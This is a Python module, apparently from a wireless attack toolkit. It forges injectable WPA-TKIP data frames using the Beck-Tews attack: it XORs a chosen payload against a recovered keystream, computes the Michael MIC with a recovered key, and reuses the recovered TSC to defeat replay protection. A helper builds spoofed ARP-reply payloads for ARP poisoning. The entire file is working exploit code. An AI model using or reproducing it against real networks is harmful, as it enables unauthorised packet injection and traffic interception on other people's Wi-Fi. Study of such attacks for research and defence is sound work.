"""Forge injectable TKIP data frames from recovered keystream (Beck-Tews).

Key-free: encryption is an XOR against the recovered per-packet keystream, never
a TK, and reuses the recovered TSC on a chosen QoS TID (the TSC-replay bypass).
"""
from __future__ import annotations

from wifit3.crack.tkip_beck_tews import Recovered
from wifit3.dot11.mac import mac_header
from wifit3.dot11.michael import michael
from wifit3.dot11.tkip import tsc_to_iv
from wifit3.dot11.wep.crypto import icv

_FC_QOS_DATA_FROM_DS_PROTECTED = bytes([0x88, 0x42])
_MIC_LEN = 8

_LLC_SNAP_ARP = bytes([0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06])
_ARP_REPLY_ETHERNET_IPV4 = bytes([0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x02])


def _qos_header(bssid: bytes, client: bytes, tid: int) -> bytes:
    header = mac_header(_FC_QOS_DATA_FROM_DS_PROTECTED, client, bssid, bssid)
    return header + bytes([tid & 0x0F, 0x00])


def forge_tkip_frame(
    recovered: Recovered, tid: int, plaintext: bytes, *, bssid: bytes, client: bytes
) -> bytes:
    """Injectable QoS TKIP data frame (AP->client) for ``plaintext`` on ``tid``,
    encrypted by XOR against ``recovered.keystream`` with its TSC in the IV."""
    michael_input = client + bssid + bytes([tid & 0xFF]) + b"\x00\x00\x00" + plaintext
    mic = michael(recovered.mic_key, michael_input)
    body = plaintext + mic + icv(plaintext + mic)
    if len(body) > len(recovered.keystream):
        raise ValueError(
            f"body needs {len(body)} keystream bytes, "
            f"recovered {len(recovered.keystream)}"
        )
    ciphertext = bytes(b ^ k for b, k in zip(body, recovered.keystream))
    return _qos_header(bssid, client, tid) + tsc_to_iv(recovered.tsc) + ciphertext


def arp_spoof_plaintext(sender_ip: bytes, target_ip: bytes, sender_mac: bytes) -> bytes:
    """LLC/SNAP + spoofed ARP-reply MSDU claiming ``sender_ip`` is at
    ``sender_mac`` (the default payload for ``forge_tkip_frame``)."""
    if len(sender_mac) != 6 or len(sender_ip) != 4 or len(target_ip) != 4:
        raise ValueError("sender_mac must be 6 bytes, IPs 4 bytes each")
    return (
        _LLC_SNAP_ARP + _ARP_REPLY_ETHERNET_IPV4
        + sender_mac + sender_ip + b"\x00" * 6 + target_ip
    )
